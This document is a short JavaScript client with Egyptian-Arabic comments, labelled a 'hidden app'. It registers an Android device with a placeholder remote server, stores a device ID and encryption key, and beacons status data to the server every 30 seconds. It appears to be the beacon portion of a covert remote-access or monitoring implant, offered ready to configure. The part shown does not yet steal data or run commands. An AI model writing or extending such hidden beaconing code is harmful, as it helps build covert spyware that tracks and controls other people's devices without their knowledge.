// إعدادات التطبيق المخفي
const SERVER_URL = 'https://your-server-url.repl.co'; // ⚠️ عدّل الرابط ده
const CHECK_IN_INTERVAL = 30000;

let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Hidden app started');
    initializeDevice();
});

async function initializeDevice() {
    try {
        if (deviceId && encryptionKey && clientId) {
            console.log('✅ Already registered');
            startCheckInService();
            return;
        }
        
        console.log('🔄 Registering new device...');
        clientId = 'client_' + Math.random().toString(36).substring(2, 15);
        deviceId = 'device_' + Math.random().toString(36).substring(2, 15);
        
        localStorage.setItem('clientId', clientId);
        localStorage.setItem('deviceId', deviceId);
        
        await registerDevice();
    } catch (error) {
        console.error('❌ Error:', error);
        setTimeout(() => initializeDevice(), 10000);
    }
}

async function registerDevice() {
    try {
        const deviceInfo = {
            deviceName: 'Android Device',
            osType: 'Android',
            osVersion: navigator.userAgent,
            appVersion: '2.0.0'
        };
        
        const response = await fetch(`${SERVER_URL}/api/clients/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId, deviceInfo })
        });
        
        const data = await response.json();
        
        if (data.success) {
            deviceId = data.deviceId;
            encryptionKey = data.encryptionKey;
            localStorage.setItem('deviceId', deviceId);
            localStorage.setItem('encryptionKey', encryptionKey);
            
            console.log('✅ Registered:', deviceId);
            startCheckInService();
        }
    } catch (error) {
        console.error('❌ Registration failed:', error);
        throw error;
    }
}

function startCheckInService() {
    console.log('🔄 Starting check-in service');
    setInterval(async () => {
        await checkIn();
    }, CHECK_IN_INTERVAL);
    checkIn();
}

async function checkIn() {
    try {
        const systemInfo = {
            deviceId,
            status: 'active',
            timestamp: new Date().toISOString()
        };
        
        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                deviceId,
                encryptedData: btoa(JSON.stringify(systemInfo))
            })
        });
        
        const data = await response.json();
        console.log('📡 Check-in:', data.success ? 'OK' : 'FAIL');
    } catch (error) {
        console.error('❌ Check-in failed:', error);
    }
}

console.log('✅ Hidden app ready');